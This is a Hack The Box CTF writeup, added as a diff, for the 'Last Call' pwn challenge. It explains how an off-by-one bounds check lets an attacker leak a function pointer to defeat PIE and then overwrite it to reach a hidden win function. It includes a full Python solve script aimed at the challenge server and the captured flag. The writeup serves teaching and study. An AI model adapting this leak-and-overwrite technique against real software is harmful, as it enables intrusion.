@@ -1,0 +1,199 @@
+---
+title: "HackTheBox: Last Call"
+date: "2026-11-03"
+description: "HTB Last Call writeup: Exploiting an off-by-one out-of-bounds index on the leaderboard to hijack vault function pointers."
+category: "Pwn"
+difficulty: "Easy"
+platform: "Hack The Box"
+tags: ["pwn", "binary-exploitation", "oob", "function-pointer-overwrite"]
+---
+
+# Last Call — Pwn Writeup
+
+*HTB challenge — Easy — binary exploitation*
+
+## Challenge Info
+
+- **Name:** Last Call
+- **Category:** Pwn
+- **Difficulty:** Easy
+- **Protections:** Full RELRO, Stack Canary, NX, PIE (all enabled)
+- **Binary functions of interest:** `main`, `init_cabinet`, `submit_score`, `view_slot`, `closing_time`, `closing_jingle`, `open_vault_for_real`
+
+The scenario text hints at the bug directly: *"The leaderboard only has 10 slots, and the firmware is ancient enough that nobody ever double-checked where slot 10 actually points."*
+
+## Data Layout
+
+From `init_cabinet`, the global `cabinet` struct looks like:
+
+```c
+struct cabinet {
+    struct {
+        char name[32];        // offset 0
+        long score;           // offset 32
+        void (*on_enter)();   // offset 40
+    } scoreboard[10];         // each 48 bytes — valid indices 0..9
+
+    struct {
+        int  unlocked;        // right after scoreboard[9]
+        void (*open_vault)(); // adjacent function pointer
+    } vault;
+
+    char pad[64];
+};
+```
+
+`scoreboard[10]` doesn't exist as a real slot — but it lands exactly on `cabinet.vault` in memory.
+
+## The Vulnerability
+
+Both `submit_score` and `view_slot` validate the index with:
+
+```c
+if (idx <= 0xA)   // allows 0..10 inclusive — should be idx <= 9
+```
+
+This off-by-one lets index `10` reach one slot past the real array, overlapping `vault`:
+
+- bytes 0–3 → `vault.unlocked`
+- bytes 4–7 → padding
+- bytes 8–15 → `vault.open_vault` (function pointer)
+- bytes 16–47 → spills into `pad[64]`
+
+`submit_score` writes 48 raw, **unvalidated** bytes straight into the slot — full control over `vault.unlocked` and `vault.open_vault`.
+
+`closing_time()`:
+
+```c
+void closing_time() {
+    if (cabinet.vault.unlocked != 0)
+        cabinet.vault.open_vault();   // calls whatever pointer we wrote
+    else
+        closing_jingle();
+}
+```
+
+### Bonus: a free info leak
+
+`view_slot(10)` dumps those same 48 raw bytes *before* any overwrite — including the current `vault.open_vault` value, which starts out equal to `closing_jingle`'s real runtime address. Since the binary is PIE, this leak gives us everything needed to defeat ASLR.
+
+## Target Addresses (static offsets, from `objdump -d`)
+
+| Function | Static offset |
+| --- | --- |
+| `closing_jingle` | `0x89b3` |
+| `open_vault_for_real` (never called anywhere — the hidden win function) | `0x89cd` |
+
+## Exploit Plan
+
+1. `view_slot(10)` → leak 48 raw bytes → bytes 8–15 (little-endian) = runtime address of `closing_jingle`.
+2. `pie_base = leaked_closing_jingle - 0x89b3`
+3. `target = pie_base + 0x89cd`
+4. `submit_score(10)` → write 48 bytes: `unlocked = 1` (4 bytes) + 4 junk bytes + `target` (8 bytes, little-endian) + 32 junk bytes.
+5. Menu option `3` (`closing_time`) → `unlocked != 0` → calls `open_vault()` → jumps into `open_vault_for_real` → flag prints.
+
+## Solve Script
+
+Pure Python standard library — no external dependencies needed (avoids `pwntools`/`unicorn` build issues on newer toolchains):
+
+```python
+import socket
+import struct
+
+HOST = '154.57.164.67'
+PORT = 37301
+
+def recv_until(sock, marker: bytes) -> bytes:
+    data = b''
+    while not data.endswith(marker):
+        chunk = sock.recv(1)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+def recv_line(sock) -> bytes:
+    data = b''
+    while not data.endswith(b'\n'):
+        chunk = sock.recv(1)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+s = socket.create_connection((HOST, PORT))
+
+def menu(choice):
+    recv_until(s, b'> ')
+    s.sendall(str(choice).encode() + b'\n')
+
+# --- Step 1: leak via view_slot(10) ---
+menu(2)
+recv_until(s, b'slot (0-9): ')
+s.sendall(b'10\n')
+
+recv_until(s, b'bytes):\n')
+raw = b''
+for _ in range(3):              # 3 lines x 16 bytes = 48 bytes
+    line = recv_line(s).split()
+    raw += bytes(int(b, 16) for b in line)
+
+leaked_ptr = struct.unpack('<Q', raw[8:16])[0]
+print(f"[+] leaked closing_jingle @ {hex(leaked_ptr)}")
+
+CLOSING_JINGLE_OFF = 0x89b3
+OPEN_VAULT_OFF     = 0x89cd
+
+pie_base = leaked_ptr - CLOSING_JINGLE_OFF
+target   = pie_base + OPEN_VAULT_OFF
+print(f"[+] pie_base = {hex(pie_base)}")
+print(f"[+] target   = {hex(target)}")
+
+# --- Step 2: overwrite via submit_score(10) ---
+menu(1)
+recv_until(s, b'slot (0-9): ')
+s.sendall(b'10\n')
+
+recv_until(s, b'jingle_ptr[8]): ')
+payload  = struct.pack('<I', 1)      # unlocked = 1
+payload += b'\x00' * 4               # padding
+payload += struct.pack('<Q', target) # open_vault = open_vault_for_real
+payload += b'\x00' * 32              # fill out the 48 bytes
+s.sendall(payload)
+
+print(recv_line(s))  # should print "saved."
+
+# --- Step 3: trigger ---
+menu(3)
+
+# read whatever comes back (the flag, hopefully)
+s.settimeout(3)
+try:
+    while True:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        print(chunk.decode(errors='replace'), end='')
+except socket.timeout:
+    pass
+```
+
+## Result
+
+```
+[+] leaked closing_jingle @ 0x7fcd36a709b3
+[+] pie_base = 0x7fcd36a68000
+[+] target   = 0x7fcd36a709cd
+saved.
+
+[cabinet] something ancient grinds, and the real vault finally gives way...
+
+HTB{th3_l3ad3rb04rd_w4s_n3v3r_th3_p01nt}
+```
+
+## Summary
+
+- **Bug class:** off-by-one bounds check on a global struct array (`idx <= 0xA` instead of `idx <= 9`), giving an arbitrary read/write into adjacent struct fields — no stack smashing or heap exploitation needed.
+- **Leak:** reading the out-of-bounds slot exposed a function pointer whose value directly revealed the PIE base.
+- **Write:** the same out-of-bounds slot let us flip a lock flag and overwrite the function pointer with the address of a function that is never called anywhere in the program's normal control flow.
+- **Trigger:** a legitimate menu path (`closing_time`) called through the corrupted pointer, landing in the hidden flag-printing function.
